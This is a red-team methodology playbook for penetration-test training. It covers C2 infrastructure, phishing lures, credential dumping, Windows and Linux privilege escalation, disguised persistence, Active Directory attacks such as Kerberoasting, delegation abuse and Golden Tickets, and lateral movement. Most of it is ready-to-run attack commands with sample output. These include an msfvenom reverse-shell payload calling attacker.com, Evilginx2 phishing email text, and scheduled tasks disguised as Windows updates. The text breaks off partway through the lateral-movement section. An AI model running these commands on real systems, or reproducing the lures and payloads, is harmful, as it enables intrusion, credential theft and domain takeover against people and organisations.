# 🔴 COMPLETE RED TEAM METHODOLOGY v1.0
## Senior Red Team Operator Playbook
### Based on CRTP | OSCP/PEN-200 | CRTO Framework

**Author:** DarcHacker (Mostafa Ibrahim)  
**Version:** 1.0 | **Last Updated:** July 2024  
**GitHub:** https://github.com/darch244/CRTP-Professional | https://github.com/darch244/OSCP-PEN200 | https://github.com/darch244/CRTO-Certified-Red-Team-Operator-study-notes

---

## TABLE OF CONTENTS
1. [Pre-Engagement & Scoping](#01-pre-engagement--scoping)
2. [External Reconnaissance](#02-external-reconnaissance)
3. [Initial Access](#03-initial-access)
4. [Host Post-Exploitation](#04-host-post-exploitation)
5. [Privilege Escalation](#05-privilege-escalation)
6. [Persistence](#06-persistence)
7. [Active Directory Attacks](#07-active-directory-attacks)
8. [Lateral Movement](#08-lateral-movement)
9. [Domain Dominance](#09-domain-dominance)
10. [Evasion & OPSEC](#10-evasion--opsec)
11. [Exfiltration](#11-exfiltration)
12. [Cleanup](#12-cleanup)
13. [Reporting](#13-reporting)

---

## 01. PRE-ENGAGEMENT & SCOPING

### Client Engagement Documents

**Critical documents to obtain BEFORE starting:**

```
□ Rules of Engagement (RoE)
  ├─ In-scope IP ranges and domains
  ├─ Out-of-scope systems (production systems, third-party services)
  ├─ Testing windows (date/time restrictions)
  ├─ Escalation procedures
  ├─ Points of contact (emergency: security team lead)
  ├─ Legal disclaimers and liability

□ Scope Definition Document
  ├─ Target network architecture (diagram)
  ├─ Testing methodology (assumed breach, external-only, full chain)
  ├─ Success criteria
  ├─ Tools permitted/restricted
  ├─ Data handling requirements

□ Business Impact Assessment
  ├─ Critical systems that must stay online
  ├─ Maximum acceptable downtime
  ├─ Change management procedures

□ Infrastructure Access Details
  ├─ VPN credentials
  ├─ Jumphost access
  ├─ Lab network credentials (if applicable)
  ├─ Baseline security tools already in place
```

### Scope Definition Checklist

```
DEFINE SCOPE:
✅ Networks in-scope?
   ├─ External:      203.0.113.0/24
   ├─ DMZ:           203.0.114.0/25
   ├─ Internal:      192.168.1.0/24

✅ Domains in-scope?
   ├─ example.com
   ├─ mail.example.com
   ├─ api.example.com

✅ Services to test?
   ├─ Web applications
   ├─ Email services
   ├─ VPN gateways
   ├─ File servers

✅ Off-limits systems?
   ├─ Production databases (❌ NO TESTING)
   ├─ Backup systems (❌ NO TESTING)
   ├─ Third-party cloud services (❌ NO TESTING)

✅ Authorization level?
   ├─ ✅ No credentials (external-only)
   ├─ ✅ Low-privilege user credentials
   ├─ ✅ Assumed breach (already have shell)

✅ Testing methodology?
   ├─ Phishing + Social Engineering allowed?
   ├─ Exploit zero-days? (clarify)
   ├─ Destructive testing? (rarely yes)
   ├─ Doable vs. actual attempt? (verify permission)
```

### Infrastructure Setup (C2 & Redirectors)

**OPSEC Principle:** Never connect directly. Always use redirectors.

#### Team Server Setup (Cobalt Strike)
```bash
# 1. Generate SSL certificate for HTTPS C2
keytool -keystore cobaltstrike.store \
  -storepass SecurePassword123 \
  -keypass SecurePassword123 \
  -genkey -keyalg RSA \
  -alias cobaltstrike \
  -dname "CN=www.windows-update.com"

# 2. Create Malleable C2 Profile
cat > http.profile << 'EOF'
set sleeptime "3000 + 1000 * rand(100) % 100";
set jitter "0.0";
set data_jitter "50";
set maxdns "255";

set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/mobile";
    client {
        header "Accept" "*/*";
        header "User-Agent" "Mozilla/5.0";
    }
    server {
        header "Content-Type" "application/json";
        output { print; }
    }
}

http-post {
    set uri "/api/v1/sync";
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        output { base64; prepend "data="; }
    }
    server {
        header "Content-Type" "application/json";
        output { print; }
    }
}
EOF

# 3. Start Team Server
sudo ./teamserver 192.168.1.100 "SecurePassword123" ./http.profile
# OUTPUT:
# [+] Team Server started on 0.0.0.0:50050
# [+] Ready for beacon connections
```

#### Redirector Setup (Apache)
```bash
# Install Apache + mod_rewrite
sudo apt install apache2 libapache2-mod-proxy-html
sudo a2enmod rewrite
sudo a2enmod proxy
sudo a2enmod proxy_http

# Configure Apache to proxy to Team Server
cat > /etc/apache2/sites-available/redirector.conf << 'EOF'
<VirtualHost *:80>
    ServerName api.trusted-domain.com
    
    # Proxy legitimate requests to Team Server
    ProxyPass / http://localhost:8080/
    ProxyPassReverse / http://localhost:8080/
    
    # Obfuscate traffic
    Header always edit Location ^/ /
    RequestHeader edit User-Agent ^.* "Mozilla/5.0"
    
    # Log to file (check for anomalies)
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF

sudo a2ensite redirector.conf
sudo systemctl restart apache2
```

---

## 02. EXTERNAL RECONNAISSANCE

### OSINT & Passive Information Gathering

**Goal:** Gather target information WITHOUT triggering any alarms.

#### Domain & Registration Research
```bash
# WHOIS lookup - find registrant info
whois example.com
# OUTPUT:
# Registrant Name: John Smith
# Registrant Email: john@example.com
# Registrant Phone: +1.555.123.4567
# Registrant Organization: Example Corp
# Created Date: 2015-05-10
# Name Server: ns1.example.com, ns2.example.com

# Reverse WHOIS - find all domains owned by same entity
# Use: domaintools.com, whoxywas.com (research only)
```

#### DNS Enumeration (Passive - No Zone Transfer)
```bash
# Standard DNS records
dig @8.8.8.8 example.com ANY
# OUTPUT:
# example.com.     300  IN A            203.0.113.5
# www.example.com. 300  IN CNAME        example.com.
# mail.example.com. 300 IN A            203.0.113.10
# example.com.     300  IN MX 10        mail.example.com.
# example.com.     300  IN TXT          "v=spf1 include:_spf.google.com ~all"

# TXT records (reveal tech stack)
dig @8.8.8.8 example.com TXT
# May reveal: SPF, DKIM, DMARC, verification tokens
```

#### Subdomain Enumeration
```bash
# Sublist3r - passive subdomain discovery
sublist3r -d example.com -o subdomains.txt
# OUTPUT:
# mail.example.com
# vpn.example.com
# dev.example.com
# api.example.com
# staging.example.com
# admin.example.com
# ftp.example.com

# Certificate Transparency logs (CT logs)
# Search: crt.sh for certificates issued for example.com
# Often reveals internal subdomains in certificate SANs
```

#### Technology Fingerprinting
```bash
# HTTP headers reveal tech stack
curl -I https://example.com
# OUTPUT:
# Server: Microsoft-IIS/10.0
# X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET
# X-UA-Compatible: IE=edge

# Identifies: IIS server, ASP.NET framework → Windows environment

# WhatRuns / Wappalyzer
# Browser extension: reveals CMS, JS frameworks, tracking, security tools
# Results: WordPress 6.1, jQuery 3.6, Cloudflare CDN, Google Analytics

# Shodan/Censys queries
# "example.com" port:"80,443,8080"
# Results: All public-facing services and their banners
```

#### Email & Employee Harvesting
```bash
# Hunter.io - verify emails for domain
# Email format pattern discovery
# OUTPUT:
# john.smith@example.com (verified, trusted source)
# jane.doe@example.com (verified, trusted source)
# admin@example.com (not verified)
# Format pattern: firstname.lastname@example.com

# Emails for phishing target list:
# IT staff (likely admin access):
#   - joe.admin@example.com
#   - security.team@example.com
# Finance (access to financial systems):
#   - accounting@example.com
# HR (access to employee data):
#   - hr.manager@example.com

# LinkedIn scraping (OSINT only)
# Search: "example.com" employees
# Job titles: 12 IT staff, 8 Developers, 3 System Admins, 4 Network Admins
```

### Passive Vulnerability Discovery

#### Decision Tree: What to Do When You Find X

```
IF you find exposed S3 bucket / FTP / SMB share
├─ ✅ EXTRACT: Customer data, code, configs
├─ ✅ NOTE: Location + contents for report
└─ ❌ DO NOT: Modify or delete anything

IF you find default credentials in metadata
├─ ✅ NOTE: Tool default creds (Jenkins, RabbitMQ, etc.)
├─ ⚠️  TRY: During exploitation phase only
└─ ❌ DO NOT: Use in OSINT phase

IF you find GitHub repos with sensitive data
├─ ✅ SEARCH: employee names, architecture, API keys
├─ ✅ REPORT: to client for removal
└─ ❌ DO NOT: Clone or modify repos

IF you find employee documents with credentials
├─ ✅ COLLECT: For phishing campaign customization
├─ ✅ NOTE: For post-exploitation credential stuffing
└─ ❌ DO NOT: Use until authorized phase begins
```

---

## 03. INITIAL ACCESS

### Phishing Campaign Setup

#### Email Reconnaissance for Phishing
```bash
# Identify email infrastructure
nslookup -type=MX example.com
# OUTPUT:
# Mail server: mail.example.com (10 priority)
# Mail server: mail2.example.com (20 priority)

# Determine if Office365 or on-premise
# Office365: outlook.office365.com SPF records
# On-premise: internal mail server

# Find email pattern used
# Employees found on LinkedIn:
#   John Smith → john.smith@example.com
#   Jane Doe → jane.doe@example.com
# Pattern: firstname.lastname@example.com
```

#### Phishing Email Delivery Methods

**Method 1: Evilginx2 - Real-time Credential Harvesting**
```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build

# Start Evilginx2
./evilginx2 -p ./phishlets

# Create Office365 phishing
> phishlet import office365
> phishlets on office365
> lures create office365

# OUTPUT:
# [+] Lure created successfully
# [+] Phishing URL: https://o365-verify-login.attacker-domain.com/login

# Send phishing email
Subject: URGENT: Verify Your Office 365 Account
Body: Your account requires immediate verification for compliance.
      [CLICK HERE TO VERIFY](https://o365-verify-login.attacker-domain.com/login)

# Monitor captured credentials
> sessions
# OUTPUT:
# [+] Credentials Captured:
#     Email: jane.doe@example.com
#     Password: MySecureP@ssword123!
#     2FA Token: 532641
#     MFA Status: Registered
#     IP: 203.0.114.55
#     User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

**Method 2: Cobalt Strike - Office Macro Payload**
```bash
# In Cobalt Strike:
# Attacks → Packages → Microsoft Office Macro

# Configuration:
# - Listener: HTTP-Primary
# - Macro Type: Word Document
# - Output: Word Macro-Enabled (.docm)

# Setup phishing email:
To: accounting@example.com, finance@example.com
Subject: 2024_Salary_Review.docm
Body: HR Department has completed your salary review.
      Please review the attached document.
Attachment: 2024_Salary_Review.docm (malicious macro)

# User opens document → "Enable Content" clicked → Beacon callback
```

**Method 3: Malicious Link with Browser Exploitation**
```bash
# Browser exploitation (if unpatched browsers present)
# Deliver via URL shortener: bit.ly, tiny.url (legitimate-looking)

# Example phishing URL:
https://bit.ly/2024-salary-review
↓ (redirects to)
https://attacker-site.com/exploit.html
↓ (browser exploit triggers)
↓ (payload downloads and executes)
↓ (Cobalt Strike beacon connects)
```

### Initial Access Validation

```
BEACON CALLBACK CONFIRMATION CHECKLIST:

□ Beacon appears in "Beacons" tab
  Beacon ID: 1
  Status: ✅ Active
  Hostname: DESKTOP-USER123
  User: EXAMPLE\jane.doe
  IP Address: 203.0.114.55
  Process: explorer.exe (4532)
  Architecture: x86 (32-bit) or x64 (64-bit)
  First Seen: 2024-07-04 14:35:10 UTC
  Last Seen: 2024-07-04 14:35:45 UTC

□ Initial system reconnaissance
  command> shell whoami
  Output: example\jane.doe
  
  command> shell whoami /all
  Output: USER NAME: EXAMPLE\jane.doe
          SID: S-1-5-21-xxx-xxx-xxx-1001
          GROUPS: Domain Users, Marketing Team, BUILTIN\Users

□ Baseline defensive posture documented
  Antivirus: Windows Defender (enabled)
  Windows Firewall: Enabled
  EDR: Not detected
  PowerShell Logging: Enabled
  
□ Success: Confirmed interactive access to target machine
```

---

## 04. HOST POST-EXPLOITATION

### Critical First 5 Commands

**Execute immediately after callback, before making any mistakes:**

```bash
# Command 1: Verify user privileges
beacon> shell whoami /priv
# OUTPUT:
# Privilege Name                    State
# SeChangeNotifyPrivilege           Enabled
# SeIncreaseWorkingSetPrivilege     Enabled
# SeShutdownPrivilege               Disabled
# [User has NO admin privileges - need to escalate]

# Command 2: Check antivirus/EDR status
beacon> shell wmic product get name | findstr /I "Kaspersky McAfee Norton Trend"
# If antivirus detected → plan evasion strategy

beacon> Get-MpComputerStatus
# OUTPUT:
# AntivirusEnabled                : True
# IsTamperProtected               : True
# QuickScanAge                    : 0 (just ran)
# FullScanAge                     : 3 (days)
# Real-time monitoring: Enabled

# Command 3: Document network configuration
beacon> shell ipconfig /all
# OUTPUT:
# Ethernet adapter: 
#   IPv4 Address: 192.168.1.105
#   Subnet Mask: 255.255.255.0
#   Default Gateway: 192.168.1.1
#   DHCP Enabled: Yes
#   DNS Servers: 192.168.1.10, 192.168.1.11 (Domain Controllers!)

# Command 4: Check domain membership
beacon> shell nltest /dsgetdc:example.com
# OUTPUT:
# DC: DC1.example.com (PDC Emulator)
# Domain: example.com
# Forest: example.com
# [Confirms domain environment]

# Command 5: Baseline system security
beacon> shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Boot Time" /C:"Install Date"
# OUTPUT:
# OS Name: Microsoft Windows 10 Enterprise
# OS Version: 10.0.19045 Build 19045
# System Boot Time: 2024-07-01 08:15:22
# Install Date: 2022-03-15
# [Possible missing patches - exploit opportunity]
```

### Network Enumeration

```bash
# Discover other hosts on network
beacon> shell arp -a
# OUTPUT:
# Interface: 192.168.1.105 --- 0x2
#   192.168.1.1   00-1a-2b-3c-4d-5e    dynamic  [Gateway/Firewall]
#   192.168.1.10  00-1a-2b-3c-4d-5f    dynamic  [Domain Controller #1]
#   192.168.1.11  00-1a-2b-3c-4d-60    dynamic  [Domain Controller #2]
#   192.168.1.50  00-1a-2b-3c-4d-61    dynamic  [MSSQL Server]
#   192.168.1.55  00-1a-2b-3c-4d-62    dynamic  [File Server]
#   192.168.1.100 00-1a-2b-3c-4d-63    dynamic  [Exchange Server]

# Identify active services
beacon> shell netstat -ano | findstr "ESTABLISHED LISTENING"
# OUTPUT:
# Proto Local Address     State        PID
# TCP   192.168.1.105:50443  192.168.1.10:389    ESTABLISHED  4012
# TCP   192.168.1.105:50544  192.168.1.11:53     ESTABLISHED  2856
# TCP   192.168.1.105:50645  8.8.8.8:53          ESTABLISHED  2856
# [Note: LDAP to DC, DNS queries, external DNS]

# Check routing table for additional networks
beacon> shell route print
# OUTPUT:
# Destination    Netmask       Gateway            Metric
# 192.168.1.0    255.255.255.0 192.168.1.105      On-link
# 10.0.0.0       255.255.0.0   192.168.1.1        1 [VPN Route to internal network]
# 0.0.0.0        0.0.0.0       192.168.1.1        Default
# [Indicates VPN access to 10.0.0.0/16 internal network]
```

### Credential Harvesting

```bash
# Check for cached credentials
beacon> shell cmdkey /list
# OUTPUT:
# Currently stored credentials:
#   Target: Domain:interactive=EXAMPLE\Administrator
#   Type: Domain Password
#   User: EXAMPLE\Administrator

# Extract browser credentials
beacon> execute-assembly /opt/tools/Mimikatz.exe '"sekurlsa::logonpasswords"'
# OUTPUT:
# Authentication Id: 0 ; 997
# Session: Service from 0
# User Name: NETWORK SERVICE
# Domain: NT AUTHORITY
# LogonId: 0x3e5
# LogonType: Service
# LogonTime: 7/4/2024 8:15:22 AM
# [*] wdigest credentials:
#   username: NT AUTHORITY\NETWORK SERVICE
#   password: (null)
#
# Authentication Id: 0 ; 999
# Session: UndefinedLogonType from 0
# User Name: jane.doe
# Domain: EXAMPLE
# LogonId: 0x3e7
# LogonType: Interactive
# LogonTime: 7/4/2024 2:15:22 PM
# [*] wdigest credentials:
#   username: EXAMPLE\jane.doe
#   password: MySecureP@ssword123! ← PLAINTEXT!
```

### Decision Tree: Escalation Path

```
Check privileges:
├─ ✅ Already SYSTEM or NT AUTHORITY\SYSTEM
│  └─ Skip to Lateral Movement (section 08)
│
├─ ⚠️  High Integrity (but not SYSTEM)
│  ├─ Try: SeImpersonatePrivilege / SeDebugPrivilege exploitation
│  ├─ Tool: Juicy Potato, Rotten Potato
│  └─ → Continue to Privilege Escalation (section 05)
│
└─ ❌ Medium Integrity (Low-Privilege User)
   ├─ Check Windows updates: systeminfo | findstr /B /C:"KB"
   ├─ Exploit kernel vulnerability (if unpatched)
   ├─ Use UAC bypass (if bypass available)
   └─ → Continue to Privilege Escalation (section 05)
```

---

## 05. PRIVILEGE ESCALATION

### Windows Privilege Escalation

#### Quick Privilege Escalation with PowerUp.ps1

```powershell
# Load PowerUp
. C:\AD\Tools\PowerUp.ps1

# Run all privilege escalation checks
Invoke-AllChecks

# OUTPUT: [Checking for privilege escalation opportunities]
# [+] Win32_Product RDP Activation Service:
#     - Service: RDPActivationService
#     - Executable Path: C:\Program Files\RDP\RDPActivation.exe
#     - [!] VULNERABLE - Unquoted Service Path!
#     - Abuse: Copy malicious exe to C:\Program.exe
#     
# [+] Modifiable Service File:
#     - Service: VulnerableService
#     - Binary: C:\Program Files\Vuln\service.exe
#     - Permissions: BUILTIN\Users has WRITE access!
#     - Abuse: Replace service.exe with beacon.exe
#     
# [+] AlwaysInstallElevated Registry:
#     - HKCU: Enabled (1)
#     - HKLM: Enabled (1)
#     - [!] CRITICAL - Can install MSI packages as SYSTEM!
```

#### Unquoted Service Path Exploitation

```bash
# Identify vulnerable service
Get-ServiceUnquoted -Verbose
# OUTPUT:
# ServiceName: VulnerableService
# Path: C:\Program Files\Vuln App\service.exe
# Vulnerability: Unquoted path allows DLL injection at:
#   C:\Program.exe
#   C:\Program Files\Vuln.exe ← Hijackable!

# Create malicious executable
.\msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
  -f exe -o "C:\Program Files\Vuln.exe"

# Trigger service restart
net stop VulnerableService
net start VulnerableService

# Malicious executable runs as SYSTEM
# Result: New high-privilege shell
```

#### UAC Bypass (Token Duplication - Juicy Potato)

```bash
# Prerequisites: SeImpersonatePrivilege enabled (check with whoami /priv)
# ImpersonatePrivilege: Enabled
# ✅ Ready for Juicy Potato exploit

# Download Juicy Potato
# https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# Execute with target process
.\JuicyPotato.exe -l 1337 -p C:\temp\beacon.exe -t *

# OUTPUT:
# [*] Juicy Potato Initialized
# [+] Current Process ID: 4532
# [+] SeImpersonatePrivilege: Enabled
# [+] Starting RPC service on port 1337
# [+] Connecting to COM service
# [+] Token impersonation successful
# [+] Creating SYSTEM process
# [+] Spawning C:\temp\beacon.exe as NT AUTHORITY\SYSTEM

# Verify elevation
beacon> shell whoami
# OUTPUT: NT AUTHORITY\SYSTEM

beacon> shell whoami /priv
# OUTPUT:
# SeDebugPrivilege                 Enabled
# SeImpersonatePrivilege          Enabled
# SeChangeNotifyPrivilege         Enabled
# [Full SYSTEM privileges]
```

#### Kernel Exploit Privilege Escalation

```bash
# Check for vulnerabilities
beacon> shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# OUTPUT:
# OS Name: Microsoft Windows 10 Enterprise
# OS Version: 10.0.19041 Build 19041
# [Vulnerable to: CVE-2021-1732, CVE-2021-21224]

# Check if patch applied
beacon> shell wmic qfe list | findstr KB5001631
# OUTPUT: (empty = not installed = VULNERABLE)

# Deploy kernel exploit
beacon> execute-assembly /opt/tools/KernelExploit.exe
# OUTPUT:
# [+] Testing for kernel vulnerabilities
# [+] Detected: CVE-2021-1732
# [+] Attempt exploitation...
# [+] ✅ Privilege escalation successful!
# [+] Running as: NT AUTHORITY\SYSTEM

beacon> shell whoami
# OUTPUT: NT AUTHORITY\SYSTEM
```

### Linux Privilege Escalation

```bash
# Check sudo privileges
sudo -l
# OUTPUT:
# User www-data may run the following commands on server:
#   (ALL) NOPASSWD: /usr/bin/python3
# ✅ Can run Python as root without password!

# Python privilege escalation
sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"
# Result: bash shell as root

# Check for SUID binaries
find / -perm -4000 2>/dev/null | head -20
# OUTPUT:
# /usr/bin/sudo          (expects)
# /usr/bin/passwd        (expects)
# /opt/custom-binary     (suspicious - custom SUID!)

# Check custom SUID binary for overflow
strings /opt/custom-binary | grep -i "buffer\|strcpy\|gets"
# If vulnerable: buffer overflow exploit → root shell

# Kernel exploitation
uname -a
# OUTPUT: Linux server 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux
# Vulnerable to: CVE-2021-22555 (netfilter buffer overflow)

# Deploy exploit
./kernel-exploit
# Result: root shell
```

---

## 06. PERSISTENCE

### Windows Persistence Mechanisms

#### ✅ Registry Run Keys (Recommended - OPSEC Safe)

```powershell
# Add beacon to user startup (survives user logoff + reboot)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
  /v "Windows Update" `
  /d "C:\temp\beacon.exe" `
  /f

# Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
# OUTPUT:
# Windows Update    REG_SZ    C:\temp\beacon.exe

# Test: Kill beacon → Wait 2 mins → Beacon auto-reconnects
# ✅ Survived user logoff ✓ Survived reboot
```

#### ⚠️ Scheduled Task Persistence (Medium Risk)

```powershell
# Create scheduled task triggered at user logon
schtasks /create `
  /tn "Windows Defender Signature Update" `
  /tr "C:\temp\beacon.exe" `
  /sc onlogon `
  /ru "SYSTEM" `
  /f

# Verify
schtasks /query /tn "Windows Defender Signature Update" /v
# OUTPUT:
# Task Name: Windows Defender Signature Update
# Run As User: SYSTEM
# Schedule: At logon of any user
# Task To Run: C:\temp\beacon.exe
# Status: Ready

# Risk: Detected by "autoruns" tool audit
# Mitigation: Hide in legitimate Windows tasks path
```

#### 🔴 WMI Event Subscription Persistence (High Risk)

```powershell
# Create WMI trigger (executes every 5 minutes - HIGH DETECTION RISK)
wmic /namespace:\\.\root\subscription PATH __EventFilter `
  CREATE Name="UpdateFilter",EventNamespace="root\cimv2", `
  QueryLanguage="WQL", `
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# Create WMI consumer (what to execute)
wmic /namespace:\\.\root\subscription PATH CommandLineEventConsumer `
  CREATE Name="UpdateConsumer",ExecutablePath="C:\temp\beacon.exe"

# Bind filter to consumer
wmic /namespace:\\.\root\subscription PATH __FilterToConsumerBinding `
  CREATE Filter=__EventFilter.Name="UpdateFilter", `
  Consumer=CommandLineEventConsumer.Name="UpdateConsumer"

# ⚠️ WARNING: Very noisy - detected by most EDR
# Survives reboot but not recommended for modern defenders
```

### Active Directory Persistence

#### ✅ AdminSDHolder Backdoor (Gold Standard)

```powershell
# Grant yourself GenericAll on AdminSDHolder container
# Result: All Domain Admin ACLs automatically replicate to you
# Survives: DA password resets, account lockouts

Add-DomainObjectAcl `
  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=example,DC=com' `
  -PrincipalIdentity student1 `
  -Rights All -Verbose

# Verify
Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=example,DC=com" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1"}

# Wait for SDProp to run (60 min) or force:
# SDProp copies AdminSDHolder ACL to all protected groups (DA, EA, etc.)
# Result: You now have full control over ALL Domain Admins!
```

#### ⚠️ DCSync Rights via ACL

```powershell
# Grant DCSync privileges (minimal but sufficient for DA)
Add-DomainObjectAcl `
  -TargetIdentity "dc=example,dc=com" `
  -PrincipalIdentity student1 `
  -Rights DCSync `
  -Verbose

# Now student1 (low-privilege user) can DCSync:
.\SafetyKatz.exe "lsadump::dcsync /user:example\krbtgt" "exit"
# Output: krbtgt NTLM hash (can create Golden Tickets)
```

---

## 07. ACTIVE DIRECTORY ATTACKS

### Domain Enumeration (PowerView)

```powershell
# Load PowerView inside Invisi-Shell (to bypass logging)
C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat
# (PowerShell without logging)

. C:\AD\Tools\PowerView.ps1

# Enumerate Domain
Get-Domain
# OUTPUT:
# Forest: example.com
# DomainName: example.com
# DomainSID: S-1-5-21-1234567890-1234567890-1234567890

# Get Domain Controllers
Get-DomainController
# OUTPUT:
# Name: DC1.example.com
# IPAddress: 192.168.1.10

# Find all users with SPN (Kerberoastable)
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
# OUTPUT:
# svcadmin    MSSQLSvc/sql1.example.com:1433
# webservice  HTTP/webapp.example.com:80
```

### Kerberoasting Attack

**Decision: Do we have credentials or are we low-privilege?**  
**→ Yes: Kerberoasting is available to ANY domain user**

```powershell
# Step 1: Find Kerberoastable accounts
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
# OUTPUT: svcadmin, MSSQLSvc/sql1.example.com:1433

# Step 2: Request TGS tickets
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt

# Step 3: Transfer hashes to Kali
# (Open encrypted tunnel, send via email, etc.)

# Step 4: Crack with Hashcat on Kali
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
# OUTPUT:
# $krb5tgs$23$...:svcadmin:MSSQLSvc_P@ssw0rd123!

# Step 5: Use cracked credentials for lateral movement
# svcadmin account → Access SQL server → Lateral movement
```

### AS-REP Roasting

**Finding users with Kerberos pre-authentication disabled:**

```powershell
# Find AS-REP Roastable users
Get-DomainUser -PreauthNotRequired | select samaccountname
# OUTPUT:
# support1user
# testuser
# svcbackup

# Request AS-REP hashes
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash

# Crack on Kali
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# OUTPUT:
# $krb5asrep$23$support1user@EXAMPLE.COM$...:Password123!
```

### Unconstrained Delegation Attack

**Finding computers with unconstrained delegation:**

```powershell
# Identify targets
Get-DomainComputer -Unconstrained | select samaccountname
# OUTPUT:
# dcorp-adminsrv (must compromise this machine)
# DC1 (automatically has it - can't abuse directly)

# Attack Flow:
# 1. Compromise dcorp-adminsrv (must have local admin)
# 2. Force Domain Controller to authenticate (Printer Bug)
# 3. Extract DC TGT from LSASS memory
# 4. Impersonate DC to access anything in domain

# Step 1: Compromise target (already have admin)
# Step 2: Force DC authentication via PrinterBug
.\MS-RPRN.exe \\DC1.example.com \\dcorp-adminsrv.example.com
# OUTPUT:
# [+] Printer Bug executed successfully
# [+] DC1 forced to authenticate to dcorp-adminsrv

# Step 3: Monitor for TGT in LSASS
.\Rubeus.exe monitor /interval:5 /nowrap
# OUTPUT:
# [+] DC TGT captured!
# [+] Ticket (base64): doIFmTCCBZWgAwIBBaEDAgEOogcDBQA...

# Step 4: Inject TGT and access DC
.\Rubeus.exe ptt /ticket:doIFmTCCBZWgAwIBBaEDAgEOogcDBQA...

# Step 5: DCSync to get all domain hashes
.\SafetyKatz.exe "lsadump::dcsync /user:example\krbtgt" "exit"
# Result: All domain hashes → Instant Domain Admin!
```

### Constrained Delegation Attack (S4U)

```powershell
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
# OUTPUT:
# websvc    MSSQLSvc/sql1.example.com:1433
# appservice CIFS/fileserver.example.com

# Attack: If we compromise websvc, we can access SQL server as ANY user
# Step 1: Get TGT for websvc
.\Rubeus.exe asktgt /user:websvc /aes256:<HASH> /opsec /ptt

# Step 2: S4U2Self - get TGS for websvc as Administrator
.\Rubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator `
  /msdsspn:"MSSQLSvc/sql1.example.com:1433" /ptt

# Step 3: Access SQL as Administrator
sqlcmd -S sql1.example.com -E
# (Integrated auth using Administrator TGS)
# Result: SQL Server database access as DA
```

### Golden Ticket Persistence

```powershell
# Get krbtgt hash (requires DA or DCSync rights)
.\SafetyKatz.exe "lsadump::dcsync /user:example\krbtgt" "exit"
# OUTPUT:
# NTLM: 7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d
# AES256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6...

# Get Domain SID
Get-DomainSID
# OUTPUT: S-1-5-21-1234567890-1234567890-1234567890

# Create Golden Ticket (valid for entire forest)
.\Rubeus.exe golden /aes256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 `
  /user:Administrator /domain:example.com `
  /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt

# Verify ticket
klist
# OUTPUT:
# Current LogonId is 0:0xaabbccdd
# Cached Tickets: (1)
#   #0> Client: Administrator @ EXAMPLE.COM
#       Server: krbtgt/EXAMPLE.COM @ EXAMPLE.COM
#       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
#       Ticket Flags: 0x40e00000
#       Start Time: 7/4/2024 14:35:10 (local)
#       End Time: 7/11/2024 14:35:10 (local) ← Valid for 7 days!

# Access Domain Controller as Administrator
Enter-PSSession -ComputerName DC1.example.com
# (Shell opens as EXAMPLE\Administrator)

# Persistence: Golden Ticket is valid for entire ticket lifetime (7 days)
# Even after all DA passwords change, Golden Ticket still works!
```

---

## 08. LATERAL MOVEMENT

### PowerShell Remoting

```powershell
# Create PSSession to remote machine
$sess = New-PSSession -ComputerName server2.example.com
# (Uses current credentials via Kerberos)

# Execute command in session
Invoke-Command -Session $sess -ScriptBlock {whoami; hostname}
# OUTPUT:
# example\jane.doe
# SERVER2

# Load tool into remote session
Invoke-Command -Session $sess -FilePath C:\AD\Tools\PowerView.ps1

# Access remote session interactively
Enter-PSSession -Session $sess
# (Full interactive shell on remote machine)
# server2> whoami
# example\jane.doe
```

### Pass-the-Hash Lateral Movement

```powershell
# Harvest NTLM hash via credential theft
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
# OUTPUT:
# User: svcadmin
# NTLM: 209c6174da490caeb422f3fa5a7ae634

# Use hash to spawn process as svcadmin (overpass-the-hash)
.\SafetyKatz.exe "sekurlsa::pth /user:svcadmin /domain:example.com `
  /ntlm:209c6174da490caeb422f3fa5a7ae634 /run:cmd.exe" "exit"

# In new window:
C:\> whoami
# OUTPUT: example\svcadmin

# Access target with svcadmin credentials
C:\> Enter-PSSession -ComputerName database-server.example.com
# (Authenticated as svcadmin)
```

### WMI / WinRM Lateral Movement

```powershell
# Check WinRM connectivity
Test-WSMan -ComputerName server2.example.com
# OUTPUT:
# wsmid           : http://schemas.dmtf.org/wbem/wscim/1/common
# ProtocolVersion : http://schemas.dmtf.org/wbem/wscim/1/protocol

# Lateral movement via Cobalt Strike
jump psremoting server2.example.com http
# OUTPUT:
# [+] Lateral movement to server2.example.com
# [+] New beacon spawning...
# [+] Beacon ID: 5 (new callback from server2)

# Or manual WMI execution
